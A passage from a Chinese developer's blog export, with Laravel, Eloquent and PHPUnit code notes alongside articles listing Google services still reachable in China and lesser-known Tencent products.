Illuminate\Foundation\Testing\RefreshDatabase;use Tests\TestCase;class ExampleTest extends TestCase&#123; /** * A basic test example. * * @return void */ public function testBasicTest() &#123; // /vendor/laravel/framework/src/Illuminate/Foundation/Testing/Concerns/MakesHttpRequests.php $response = $this-&gt;get('/'); // /vendor/laravel/framework/src/Illuminate/Foundation/Testing/TestResponse.php $response-&gt;assertStatus(200); &#125;&#125;vendor/bin/phpunit tests/ExampleTest.phphttps://learnku.com/articles/37699 ORM 禁止 update_at 的自动更新1234567891011121314Call to a member function toDateTimeString() on string$user = \App\Models\User::find(1); $user-&gt;sex = 1; $user-&gt;timestamps = false; $user-&gt;save(); $updatedUser =$user-&gt;fresh(); return [ 'id' =&gt; $updatedUser-&gt;id, 'name' =&gt; $updatedUser-&gt;name, 'sex' =&gt; $updatedUser-&gt;sex, 'created_at' =&gt; $updatedUser-&gt;created_at-&gt;toDateTimeString(), 'updated_at' =&gt; $updatedUser-&gt;updated_at-&gt;toDateTimeString(), ];https://learnku.com/articles/37717 无限级分类12345678910111213141516171819202122232425Schema::create('categories', function (Blueprint $table) &#123; $table-&gt;increments('id'); $table-&gt;integer('parent_id'); $table-&gt;string('code'); $table-&gt;string('name'); $table-&gt;string('path'); $table-&gt;timestamps();&#125;);public function childCategory() &#123; return $this-&gt;hasMany('App\Models\Category', 'parent_id', 'id');&#125;public function allChildrenCategorys()&#123; return $this-&gt;childCategory()-&gt;with('allChildrenCategorys');&#125;//无限极分类测试public function index()&#123; $category = Category::with('allChildrenCategorys')-&gt;find(5); $re = $category-&gt;allChildrenCategorys; dd($re);&#125;//find一个parent_id = 0就可以https://learnku.com/articles/14068/simple-practice-of-laravel-infinite-class-classification Laravel 在 with 查询中只查询个别字段123456789101112131415161718192021222324252627282930313233$topics = Topic::limit(2)-&gt;with(['user'=&gt;function($query)&#123; $query-&gt;select('id','username');&#125;])-&gt;get();class BaseModel extends \Eloquent&#123; public function scopeWithOnly($query, $relation, Array $columns) &#123; return $query-&gt;with([$relation =&gt; function ($query) use ($columns)&#123; $query-&gt;select(array_merge(['id'], $columns)); &#125;]); &#125;&#125;在我们普通的 Model 类都继承基类：class Topic extends BaseModel&#123; public function user() &#123; return $this-&gt;belongsTo('User'); &#125;&#125;然后使用就很方便了:https://learnku.com/laravel/t/1220/laravel-queries-only-individual-fields-in-with-q$topics = Topic::limit(2)-&gt;withOnly('user', ['username'])-&gt;get();public function scopeWithOnly(object $query, string $relation, array $columns) &#123; return $query-&gt;with([$relation =&gt; function ($query) use ($columns) &#123; if (count($columns) == 1) &#123; $columns = array_merge(['id'], $columns); &#125; $query-&gt;select($columns); &#125;]); &#125; 同步config123456789file_put_contents(base_path() . '/config/cnpscy.php', '&lt;?php return ' . var_export($data_list, true) . ';');$data_list 数组的 key =&gt; value 格式即可。我是存放 config 下面的 cnpscy读取：config('cnpscy.key')https://learnku.com/laravel/t/38053 删除MySQL数据12345678910111213141516$start = time();while(true) &#123; try &#123; if(time() - $start &gt; 100) &#123; // break; \DB::disconnect('mysql::write');//断开重新连接 $sql="SET SESSION wait_timeout=65535"; \DB::connection('mysql::write')-&gt;select($sql); $start = time(); &#125; \DB::connection('mysql::write')-&gt;where('id','&gt;', 0)-&gt;delete(); &#125;catch (\Exception $e) &#123; sleep(1); //exit(); \DB::reconnect('mysql::write'); &#125; composer 支持laravel123456789101112131415161718192021222324252627282930313233343536373839404142https://github.com/shanyul/array2xmlcat composer.json"extra": &#123; "laravel": &#123; "providers": [ "Shanyuliang\\Array2xml\\ServiceProvider" ] &#125; &#125;ServiceProvider.phpnamespace Shanyuliang\Array2xml;class ServiceProvider extends \Illuminate\Support\ServiceProvider&#123; protected $defer = true; public function register() &#123; $this-&gt;app-&gt;singleton(Array2xml::class, function()&#123; return new Array2xml(); &#125;); $this-&gt;app-&gt;alias(Array2xml::class, 'array2xml'); &#125; public function provides() &#123; return [Array2xml::class, 'array2xml']; &#125;&#125;public function getXml() &#123; $arr = [ 'aaa' =&gt; [ 'bbb' =&gt; 'ccc', 'eee' =&gt; 'fff' ] ]; $response = app('array2xml')-&gt;generate($arr);&#125; Eloquent Collection 中获 id 数组12345678// 返回ID数组$permissionIDs = $role-&gt;permissions-&gt;pluck('id'); //与上述结果相同。甚至相同的字符数:)$permissionIDs = $role-&gt;permissions-&gt;modelKeys();$allPermissions = Permission::pluck('id');$permissions = $role-&gt;permissions-&gt;pluck('id');$allPermissions = Permission::all()-&gt;modelKeys();https://learnku.com/laravel/t/39007 hasMany 来处理『无限极分类』12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849Schema::create('categories', function (Blueprint $table) &#123; $table-&gt;bigIncrements('id'); $table-&gt;string('name'); $table-&gt;unsignedBigInteger('category_id')-&gt;nullable(); $table-&gt;foreign('category_id')-&gt;references('id')-&gt;on('categories'); $table-&gt;timestamps();&#125;);class Category extends Model&#123; public function categories() &#123; return $this-&gt;hasMany(Category::class); &#125;&#125;public function childrenCategories()&#123; return $this-&gt;hasMany(Category::class)-&gt;with('categories');&#125;调用 Category::with(‘categories’)，将得到下级 “子分类”，但是通过 Category::with(‘childrenCategories’) 将能帮你实现无限极。public function index()&#123; $categories = Category::whereNull('category_id') -&gt;with('childrenCategories') -&gt;get(); return view('categories', compact('categories'));&#125;resources/views/categories.blade.php&lt;ul&gt; @foreach ($categories as $category) &lt;li&gt;&#123;&#123; $category-&gt;name &#125;&#125;&lt;/li&gt; &lt;ul&gt; @foreach ($category-&gt;childrenCategories as $childCategory) @include('child_category', ['child_category' =&gt; $childCategory]) @endforeach &lt;/ul&gt; @endforeach&lt;/ul&gt; resources/views/admin/child_category.blade.php&lt;li&gt;&#123;&#123; $child_category-&gt;name &#125;&#125;&lt;/li&gt;@if ($child_category-&gt;categories) &lt;ul&gt; @foreach ($child_category-&gt;categories as $childCategory) @include('child_category', ['child_category' =&gt; $childCategory]) @endforeach &lt;/ul&gt;@endifhttps://learnku.com/laravel/t/38977 路由不生效12345678910111213Effect 为正常控制器补录 Effect_back 为旧的使用 find . -name "*.php" |xargs grep -i "Effect_back" 发现了问题所在./vendor/composer/autoload_classmap.php: 'App\\Http\\Controllers\\Effect\\ActivityController' =&gt; $baseDir . '/app/Http/Controllers/Effect_back/ActivityController.php',此问题应该是在你有新旧文件时 执行过 composer dump-autoload 所导致旧的文件自动加载进来 并进行了缓存composer clear-cachecomposer dump-autoloadhttps://learnku.com/articles/39287 Laravel Eloquent12345678910111213141516171819202122232425262728293031323334$user = User::where('name', 'wuqinqiang')-&gt;first();$user-&gt;age = 18;$user-&gt;wechat-&gt;nickName = "Remember";$user-&gt;save()那么此时，会保存用户信息，但是并不会保存对应 Wechat 的关联信息，想让它一起保存咋么办？也很简单。把 save 换成 push 即可。$user-&gt;push(); public static function boot() &#123; parent::boot(); static::creating(function ($model) &#123; //业务逻辑 &#125;); &#125;那要是不想在操作时触发任何事件则么办？你可以执行一个回调函数而无需触发任何事件:$user = User::withoutEvents(function () &#123;return //保存或者更新代码&#125;); $ user = User :: where('name','wuqinqiang')-&gt;first(); $ user-&gt; isDirty（）; // 还没被动过 返回 false $ user-&gt; name ='curry'; $ user-&gt; isDirty（）; //模型被动过了 返回true $ user-&gt; isDirty（'email'）; // 可以传入参数 验证某个参数是否被动过，这个我还没碰过 当然 false $ user-&gt; isDirty（'name'）; // true 如果你还想具体了解到哪些是被动过了，可以使用: $user-&gt;getDirty(); 你将得到一个数组 ["name" =&gt; "curry"] $ user = User :: where('name','wuqinqiang')-&gt;first(); $user-&gt;name = 'curry'; $user-&gt;getOriginal(); // 返回数组 "name" =&gt; "wuqinqiang" $user-&gt;getOriginal('name'); //指定要看哪个属性的原值 "wuqinqiang" https://learnku.com/articles/39263 自定义 Artisan 命令1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192// routes/console.phpArtisan::command('password:reset &#123;userId&#125; &#123;--sendEmail&#125;', function()&#123; // 第一个参数是命令的名称 // 执行一些操作 ，比如重置用户密码 ...&#125;)protected $signature = 'password:reset &#123;userId&#125; &#123;--sendEmail&#125;'; // 定义 ：password:reset &#123;userId&#125; // 执行 ：php artisan password:reset 5 $this-&gt;argument(); // 返回一个包含所有参数的数组（ 第一个元素是命令名称 ） // [ // "command" =&gt; "password:reset", // "userId" =&gt; "5" // ] $this-&gt;argument('userId'); // "5"// 定义 ：password:reset &#123;--userId=&#125; // 执行 ：php artisan password:reset --userId=5 $this-&gt;option(); // 返回一个包含所有选项的数组 // [ // "userId" =&gt; "5", // "help" =&gt; false, // "quiet" =&gt; false, // "verbose" =&gt; false, // "version" =&gt; false, // "ansi" =&gt; false, // "no-interaction" =&gt; false, // "env" =&gt; null // ] $this-&gt;option('userId'); // "5"// 提示用户输入$email = $this-&gt;ask("你的邮箱是什么？");// 提示用户输入 ，但用 "*" 隐藏输入内容$password = $this-&gt;secret("你的数据库密码是什么？");// 提示用户输入是 / 否 ，返回布尔值 ，除了按 y 和 Y ，其他的输入都会返回 falseif ($this-&gt;confirm("你确定要重置用户的密码？"));// 提示用户选择选项 ，如果用户没有选择 ，默认值就是最后一个选项$tips = '你希望在每天什么时间备份数据库？'$options = array("08:00", "20:00", "12:00");$default = 0;$index = $this-&gt;choice($tips, $options, $default);// 这里注意返回的是用户选择的 key ，而不是 valueprint_r($optios[$index]);// 还可以使用关联数组$tips = '你现在有两个选择';$options = array("a" =&gt; "自己脱", "b" =&gt; "我帮你脱");$default = "b";$index = $this-&gt;choice($tips, $options, $default);print_r($optios[$index]);$headers = array('name', 'email');$data = array( array('马云', 'jack_ma@aliyun.com'), array('马化腾', 'pony@qq.com'));// $data = App\User::all(['name', 'email'])-&gt;toArray();$this-&gt;table($headers, $data);// 将进度条分为 10 份$total = 10;// 创建进度条$this-&gt;output-&gt;progressStart($total);// 循环for ($i = 0; $i &lt; $total; $i++) &#123; sleep(1); // 进度条步进 $this-&gt;output-&gt;progressAdvance();&#125;// 结束进度条$this-&gt;output-&gt;progressFinish();# 22/10 [=====&gt;----------------------] 20%# 1010/10 [============================] 100%// Artisan::call()Route::get('test-artisan', function () &#123; $exitCode = Artisan::call("password:reset", [ 'userId' =&gt; 15, '--sendEmail' =&gt; true ])&#125;)// $this-&gt;call() 或者 $this-&gt;callSilent()Route::get('test-artisan', function () &#123; // 这个 callSilent() 有什么区别我也不太懂 $exitCode = $this-&gt;callSilent("password:reset", [ 'userId' =&gt; 15, '--sendEmail' =&gt; true ])&#125;)https://learnku.com/articles/39394 递归子级1234567891011121314在 model 里面增加子级关联 public function child()&#123; return $this-&gt;hasMany(self::class,'pid'); &#125;在 model 里面增加子级递归关联 public function childRecursive() &#123; return $this-&gt;child()-&gt;with('childRecursive'); &#125;调用的时候建议用 with 方法预加载https://learnku.com/articles/39687 $menu = Menu::with('childRecursive')-&gt;find($id); laravel5.5 博客第八篇 多商户laravel vue开源商城 基于 Laravel + swoole + 小程序的开源电商系统 Laravel API 错误处理 laravel + swoole + adminlte 高效开发模板 Laravel 项目 伪静态分页处理 更快的找到自己所需的模型关联类型 Laravel-dompdf优雅导出PDF Laravel + Vue + Oss 搭建的图片墙小站 Laravel editor.md 支持截图 / 粘贴上传图片 ConsoleTVs/Charts 简单快速绘制统计图 91 个常见的 Laravel 面试题和答案 Laravel 5.2 项目升级至 5.8 的过程 Laravel 中实现「福勒的货币设计模式」 Laravel6.0 框架和 semantic-ui 开发的一个个人博客社区网站 laravel 源码详解 仿 Laravel-china 的搜索包 Laravel 5.5 + H+UI 框架的权限管理后台 Laravel 服务容器 博客支持 Markdown,支持 RBAC 权限管理 三分钟从零部署 Laravel 应用到阿里云 ECS Laravel+easywechat 实现公众号微信支付 Laravel-Gii 可视化代码生成工具 Laravel + Vue + Swoole 实现的简单 Web 聊天 laravel容器 Laravel MongoDB 数据库查询 Laravel 框架 5.1 升级到 5.5 php excel Laravel 性能优化入门 安装 laradock 以及运行 Laravel 项目 过滤敏感词汇扩展 Windows 环境下安装 Laravel Laravel-layui-admin : 支持 Laravel6.0 的 RBAC 后台系统 Laravel-Binlog 扩展 Laravel 自带消息模块搭建小程序实时推送消息 基于支付宝 OpenAPI 开源的 PHP 语言版本 SDK gitbook 的 Laravel 源码详解 Application 类 make 方法调用栈流程图 快速laravel后台管理系统 PHP 实现 Websocket 协议 Laravel-S 项目之初体验 基于laravel5.5 + H-ui开发的一款基础后台管理系统 快速laravel后台管理系统 Laravel-admin 码的电子商务前后端系统 Laravel+vue 个人博客https://github.com/sweida/laravel-blog-api/ 详解 laravel 源码 https://leoyang90.gitbooks.io/laravel-source-analysis/content/ web开发者知识体系电子书 EasyWechat 和 Laravel notification 发送微信小程序模板消息 QQ 登录、微信登录、微博登录、GitHub 登录 快速定位无用路由 Laravel 上将图片上传到阿里云 OSS 快速记忆php系统数组函数 附近的店铺 高性能的定时调度服务Forsun的Laravel组件 Laravel 查询附近的数据 elasticsearch中文发行版 多级联动 Laravel 下 Elasticsearch/Algolia 全文搜索 Phpstorm 开启 Laravel 代码提示 PHP 最优秀资源的整理汇集 腾讯地图搜索 Laravel 框架 5.1 升级到 5.5 Laravel Authorization：支持 ACL、RBAC、ABAC 等模型的授权库 PSR-12 编码规范扩充 Laravel 下 Elasticsearch/Algolia 全文搜索 使用案例 轻量级全文检索引擎 TNTSearch 和中文分词 laravel下TNTSearch+jieba-php实现中文全文搜索 postman使用记录 免费开源的在线文档管理插件 诗词博客 Elasticsearch 国内镜像下载站 PHP抖音机器人]]></content>
  </entry>
  <entry>
    <title><![CDATA[那些在国内还能使用的谷歌产品]]></title>
    <url>%2F2019%2F10%2F15%2F%E9%82%A3%E4%BA%9B%E5%9C%A8%E5%9B%BD%E5%86%85%E8%BF%98%E8%83%BD%E4%BD%BF%E7%94%A8%E7%9A%84%E8%B0%B7%E6%AD%8C%E4%BA%A7%E5%93%81%2F</url>
    <content type="text"><![CDATA[前几天是谷歌成立21周年纪念日 https://www.google.com/doodles/googles-21st-birthday ，感谢谷歌给互联网带来的便利。之前写过百度那些你可能不知道的百度产品 和腾讯那些你可能不知道的腾讯产品 ，正好再来说说谷歌，谷歌的所有产品 https://about.google/intl/zh-CN/products/ 在这里有介绍，谷歌最好的产品自然是搜索了，可惜国内用不了（想上谷歌在公众号回复 谷歌 获取使用方法），尽管谷歌退出中国多年，但还是有不少服务能在国内继续使用，这里做个整理。 Chrome 浏览器我平常用的浏览器就是 Chrome 了，国内Chrome使用的是 google.cn域名（可惜不能用于搜索） https://www.google.cn/intl/zh-CN/chrome/ ，直接下载就好，强烈推荐你使用Chrome浏览器。 谷歌地图之前有域名 ditu.google.cn ，但现在上不去了 ，它会跳转到google.cn ，https://www.google.cn/maps 也会重定向到 google.cn ，但是电脑访问 http://www.google.cn//maps 居然还可以继续使用。 还有个更酷炫的谷歌地球https://earth.google.com/web/ ，可惜国内没法用。 谷歌翻译http://translate.google.cn/ 这个二级域名可以直接使用谷歌翻译。 谷歌开发者https://developers.google.cn/ 这是针对开发者使用的产品。https://developer.android.google.cn/?hl=th安卓开发者应该很需要 https://developer.android.google.cn/ golanggolang 是谷歌开发的一种语言，https://golang.google.cn/ 。文档也能打开https://golang.google.cn/doc/ ，当然使用go get 的时候推荐使用代理 https://goproxy.io/ https://goproxy.cn/ 谷歌广告https://ads.google.cn/intl/zh-CN_cn/home/ 你应该经常能在网站上看到谷歌的广告，国内的公司也可以投放。 谷歌文档http://www.google.cn/docs/about/ 这个能打开，可惜点击后还是跳转到https://docs.google.com/document/?usp=mkt_docs ，对应的国内可以使用腾讯文档。 谷歌 DNSGoogle Public DNS 是Google于2009年12月5日起提供的一个免费域名解析服务，具体看维基百科https://zh.wikipedia.org/wiki/Google_Public_DNS1234567891011121314151617181920λ ping 8.8.8.8正在 Ping 8.8.8.8 具有 32 字节的数据:来自 8.8.8.8 的回复: 字节=32 时间=41ms TTL=52来自 8.8.8.8 的回复: 字节=32 时间=40ms TTL=52来自 8.8.8.8 的回复: 字节=32 时间=42ms TTL=52来自 8.8.8.8 的回复: 字节=32 时间=40ms TTL=528.8.8.8 的 Ping 统计信息: 数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，往返行程的估计时间(以毫秒为单位): 最短 = 40ms，最长 = 42ms，平均 = 40msλ nslookup baidu.com 8.8.8.8服务器: dns.googleAddress: 8.8.8.8非权威应答:名称: baidu.comAddress: 39.156.69.79 访问39.156.69.79 这个ip就可以直接访问百度。 另外谷歌学术 https://scholar.google.com/ 可以使用镜像 https://xs.glgoo.top/scholar/ ，搜索结果一样。 Google play 可以使用 https://apkcombo.com/apk-downloader/ 输入play地址，比如谷歌拼音的https://play.google.com/store/apps/details?id=com.google.android.inputmethod.pinyin&amp;hl=zh_CN 获取apk下载地址安装到手机上，我试了下速度还可以。 我平常用得比较多就是 gmail ， 谷歌搜索，谷歌相册，相册可以借助 https://takeout.google.com/ 这个导出所有相片。 除了上面这些产品，谷歌还陆陆续续关闭了不少产品，https://killedbygoogle.com/ 这个网站做了个整理，有上百个，我觉得Google+挺可惜的。 其他Google地球https://www.google.com/intl/zh-CN/earth/谷歌学术https://blog.csdn.net/love666666shen/article/details/75311407 https://www.scholarnet.cn/Google Fi 是Google旗下的移动虚拟运营商http://www.googlevoice.net/index.php/archives/125/ https://fi.google.com/about/tos/https://cn.v2ex.com/t/606311site:github.io 上谷歌 https://panmuboke.github.io/谷歌学术https://lingan1996.github.io/ssr%E4%B8%8Agoogle-scholar/https://haoel.github.io/科学上网总结https://bibichuan.github.io/2019/02/16/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E7%9A%84%E6%8A%80%E6%9C%AF%E6%80%BB%E7%BB%93/http://www.google.com/about谷歌声明https://www.google.com/press/shengminghttps://lusongsong.com/reed/170.htmlhttp://xcx1024.com/ArtInfo/92473.htmlhttps://www.google.cn/chrome/?standalone=1&amp;platform=win64http://www.google.cn/docs/about/https://www.zhihu.com/question/326911592firebase.google.cnhttps://542869246.github.io/2018/10/23/%E6%8E%A8%E8%8D%90%E5%87%A0%E6%AC%BE%E4%B8%AA%E4%BA%BA%E4%BD%BF%E7%94%A8%E7%9A%84Chrome%E6%8F%92%E4%BB%B6/chrome 扩展 https://wsgzao.github.io/post/chrome-extensions/https://asura88.github.io/2018/10/13/%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91/查看 Google 搜索结果中的缓存版网页 https://limbopro.github.io/archives/243.html https://github.com/ssrpanel/一个逗比写的逗比脚本 https://github.com/ToyoDAdoubi/doubihttps://10beasts.net/best-vpn/china/https://laod.cn/news/googles-21st-birthday.htmlhttps://www.kanfeidie.com/idea/network/287.htmlhttps://strivebo.com/2019/02/12/%E7%AF%871%EF%BC%9A%E7%A7%91%E5%AD%A6%E4%B8%8A%E7%BD%91%E6%96%B9%E5%BC%8F%E6%80%BB%E7%BB%93/ 科学上网墙外 https://www.bvsuper.com/index.php/archives/183/shadowsocks+vps+mac https://michael728.github.io/2019/04/27/tools-ss-vps/https://piaohanshenghuo.com/ke-xue-shang-wang/google play apk https://www.anzhiapp.com/ssh脚本https://github.com/ToyoDAdoubi/doubi/手机谷歌 http://www.appchina.com/dna/538google ws tls cdn 推荐阅读: 公众号苏生不惑原创文章整理 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 那些你可能不知道的 bilibili 奇技淫巧 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[那些你可能不知道的腾讯产品]]></title>
    <url>%2F2019%2F10%2F15%2F%E9%82%A3%E4%BA%9B%E4%BD%A0%E5%8F%AF%E8%83%BD%E4%B8%8D%E7%9F%A5%E9%81%93%E7%9A%84%E8%85%BE%E8%AE%AF%E4%BA%A7%E5%93%81%2F</url>
    <content type="text"><![CDATA[相比百度那些你可能不知道的百度产品，腾讯的产品也是多如牛毛https://www.qq.com/map/ 这里列出了腾讯几百个产品。 QQ，微信，公众号这些就不说了，这里说下你可能不知道但非常实用的腾讯产品。 腾讯文档看很多人在用石墨文档，其实腾讯文档也是一款可多人协作的在线文档，支持Word、Excel和PPT类型，打开网页就能查看和编辑，云端实时保存；可多人实时编辑文档，权限安全可控 。https://docs.qq.com/desktop和本地使用Word体验差不多，markdown也支持，还支持多人同时编辑，手机端还有小程序，值得推荐下。 微云微云是腾讯公司为用户精心打造的一项智能云服务, 您可以通过微云方便地在手机和电脑之间同步文件、推送照片和传输数据。https://www.weiyun.com/ ，不知道为什么没用QQ的二级域名，除了百度网盘，微云也是个选择。比如这个微博备份工具 https://share.weiyun.com/56v1cyU 吐个槽吐个槽是腾讯推出的一款轻量、免费的用户意见反馈服务平台，旨在方便地嵌入APP/微信公众号/QQ公众号，为中小企业或团队快速搭建用户反馈通道，用户还能发帖反馈。 https://tucao.qq.com 如果你的公司想做一个用户反馈系统，完全可以用腾讯的这个，效果见https://support.qq.com/products/1368 腾讯问卷腾讯问卷，是腾讯公司推出的免费、专业的问卷调查系统。提供多种方式创建问卷，简单高效的编辑方式，强大的逻辑设置功能，专业的数据统计和样本甄别https://wj.qq.com/ 腾讯软件pc上下载软件不用百度挨个找，这里有非常多的软件 https://pc.qq.com/ 手机端也有，就是应用宝 https://sj.qq.com/ 图片处理有3款产品: 看图 https://kantu.qq.com/ ， 截图 https://jietu.qq.com/，天天P图[https://tu.qq.com/](https://tu.qq.com/)，女生可能喜欢用。 设计导航设计师应该知道这个导航站 https://idesign.qq.com/#!index/feed/id/1 腾讯智图智图是腾讯前端团队开发的一个专门用于图片压缩和图片格式转换的平台，可以对png,jpeg,gif等各类格式图片的压缩，以及为上传图片自动选择最优的图片格式，同时，智图平台还会为用户转换一份webp格式的图片，图片压缩后的质量非常好，而且体积减少很多。https://zhitu.isux.us/ 还提供客户端 最后提下腾讯的小程序灵鲲金融风险查询举报中心，想知道如何判断一个项目是不是传销？这个小程序可以自动识别大部分传销项目。如果家里有人被忽悠加入了这样的项目，可以用来鉴别下。 还有哪些你常用的腾讯产品可以分享下。 其他小Q机器人https://qrobot.qq.com/#/微信电话本https://dianhua.qq.comhttps://ixdc.org/?p=14274https://ai.qq.com 手机号即可注册，不限调用次数，默认给 1QPS 的并发；填写姓名、身份证和银行卡号后升级到 2QPShttps://www.yuque.com/dashboardOffice 365 是一种订阅式的跨平台办公软件，基于云平台提供多种服务，通过将 Excel 和 Outlook 等应用与 OneDrive 和 Microsoft Teams 等强大的云服务相结合，Office 365 可让任何人使用任何设备随时随地创建和共享内容。可支持多人协同在线编辑 。https://kimgkw2-my.sharepoint.com/:w:/g/personal/llpdev_52ove_cf/EUjFI3YILWJPjTXUbtyX-fQB1J1TjmzfVhMMrt2atP1-7A?e=JEaHBC推荐阅读: 如何发一条空白的朋友圈 免费在线听周杰伦歌曲 那些你可能不知道的微信奇技淫巧 如何在豆瓣租房小组快速找到满意的房子 10%+10% 不等于 0.2？ Chrome 浏览器扩展神器油猴 那些你可能不知道的 bilibili 奇技淫巧 上班工作压力太大?来玩个游戏解压下 那些你可能不知道的百度产品 公众号：苏生不惑]]></content>
      <tags>
        <tag>公众号</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php 单元测试]]></title>
    <url>%2F2019%2F10%2F12%2Fphp-%E5%8D%95%E5%85%83%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[常用命令1234567891011121314新建一个单元测试php artisan make:test ReplyTest --unit单独执行某个测试 phpunit tests/Unit/ReplyTest.php单独执行某个测试中的函数phpunit --filter a_thread_has_a_creator带上测试环境变量进行测试就不需要 CsrfTokenAPP_ENV=testing phpunit --filter an_authenticated_user_may_participate_in_forum_threadsAPP_ENV=testing phpunit 测试类例子1234567891011121314151617181920212223242526272829303132333435363738394041class TestCase extends Illuminate\Foundation\Testing\TestCase &#123; /** * Creates the application. * * @return \Illuminate\Foundation\Application */ public function createApplication() &#123; $app = require __DIR__.'/../bootstrap/app.php'; $app-&gt;make('Illuminate\Contracts\Console\Kernel')-&gt;bootstrap(); return $app; &#125;&#125;class FooTest extends TestCase &#123; public function testSomethingIsTrue() &#123; $this-&gt;assertTrue(true); &#125;&#125;你可以从终端机执行phpunit 命令来执行应用程序的所有测试。$response = $this-&gt;call('GET', 'user/profile');$response = $this-&gt;call($method, $uri, $parameters, $cookies, $files, $server, $content);接着你可以检查Illuminate\Http\Response 对象：$this-&gt;assertEquals('Hello World', $response-&gt;getContent());从测试调用控制器你也可以从测试调用控制器：$response = $this-&gt;action('GET', 'HomeController@index');$response = $this-&gt;action('GET', 'UserController@profile', array('user' =&gt; 1)); phpunit.xml1234567891011121314151617181920212223&lt;?xml version="1.0" encoding="UTF-8"?&gt;&lt;phpunit backupGlobals="false" backupStaticAttributes="false" bootstrap="bootstrap/autoload.php" colors="true" convertErrorsToExceptions="true" convertNoticesToExceptions="true" convertWarningsToExceptions="true" processIsolation="false" stopOnFailure="false" syntaxCheck="false"&gt; &lt;testsuites&gt; &lt;testsuite name="Application Test Suite"&gt; &lt;directory&gt;./tests/&lt;/directory&gt; &lt;/testsuite&gt; &lt;/testsuites&gt; &lt;php&gt; &lt;env name="APP_ENV" value="testing"/&gt; &lt;env name="CACHE_DRIVER" value="array"/&gt; &lt;env name="SESSION_DRIVER" value="array"/&gt; &lt;env name="QUEUE_DRIVER" value="sync"/&gt; &lt;/php&gt;&lt;/phpunit&gt; 覆盖率123456789101112131415161718192021pecl install xdebugphp.ini 手动添加 zend_extension=xdebug.so php -m|grep xdebugphpunit --coverage-html ./tests/report 来生成 html 报告在 phpunit.xml 添加如下代码：&lt;filter&gt; &lt;!--这里配置了白名单，只有这里边的代码会被统计覆盖率--&gt; &lt;whitelist processUncoveredFilesFromWhitelist="true"&gt; &lt;directory suffix=".php"&gt;./tests/Unit&lt;/directory&gt; &lt;/whitelist&gt; &lt;/filter&gt;&lt;logging&gt; &lt;log type="coverage-html" target="./tests/report" charset="UTF-8"/&gt;&lt;/logging&gt; 然后直接执行 phpunit 即可。 https://learnku.com/articles/24030视频 https://58hualong.com/course/16/PHP-dan-yuan-ce-shi第七课：Mockery 测试demo12345git clone https://github.com/sebastianbergmann/money.gitphpunit --configuration build/phpunit.xml//或者如下执行方式也行php build/tools/phpunit.phar --configuration build/phpunit.xmlhttp://yyeer.com/%E7%BC%96%E7%A8%8B/2018/05/04/PHP%E4%BB%A3%E7%A0%81%E8%A6%86%E7%9B%96%E7%8E%87%E4%B8%80%E8%B5%B7%E7%8E%A9/#4phpunit指令和xml配置了解一下 hook12345678910111213141516171819202122232425262728293031323334353637383940414243444546PHPUnit则为我们提供了全面的hook接口：public static function setUpBeforeClass()/tearDownAfterClass()//测试类构建/解构时调用protected function setUp()/tearDown()//测试方法执行前/后调用protected function assertPreConditions()/assertPostConditions()//断言前/后调用&lt;?phpnamespace Tests;use App\Example;use PHPUnit\Framework\TestCase as BaseTestCase;class ExampleTest extends BaseTestCase&#123; // 类静态属性 private static $example; public static function setUpBeforeClass() &#123; self::$example = new Example(); &#125; public function testGetTrue() &#123; // 类的静态属性更新 self::$example-&gt;setMsg("hello big_cat"); $result = self::$example-&gt;getTrue(); $this-&gt;assertTrue($result); &#125; public function testGetFalse() &#123; $result = self::$example-&gt;getFalse(); $this-&gt;assertFalse($result); &#125; /** * 依赖 testGetTrue 执行完毕 * @depends testGetTrue * @return [type] [description] */ public function testGetMsg() &#123; $result = self::$example-&gt;getMsg(); $this-&gt;assertEquals($result, "hello big_cat"); &#125;&#125; Laravel 中基于 PHPUnit 进行代码测试 单元测试demo Laravel 单元测试那些事 单元测试 PHP单元测试-mock和数据库测试 测试：入门指南 基于Laravel的项目的单元测试规范 phpunit文档 PHPUnit 入门教程 PHP 单元测试覆盖率 phpunit 快速入门 测试简介 使用 PHPUnit 进行单元和功能测试 Laravel 测试之 —— PHPUnit 入门教程 PHPUnit 进行单元测试并生成代码覆盖率报告 使用桩件 (Stub) 解决 Laravel 单元测试中的依赖]]></content>
  </entry>
  <entry>
    <title><![CDATA[公众号苏生不惑原创文章整理]]></title>
    <url>%2F2019%2F10%2F09%2F%E5%85%AC%E4%BC%97%E5%8F%B7%E8%8B%8F%E7%94%9F%E4%B8%8D%E6%83%91%E5%8E%9F%E5%88%9B%E6%96%87%E7%AB%A0%E6%95%B4%E7%90%86%2F</url>
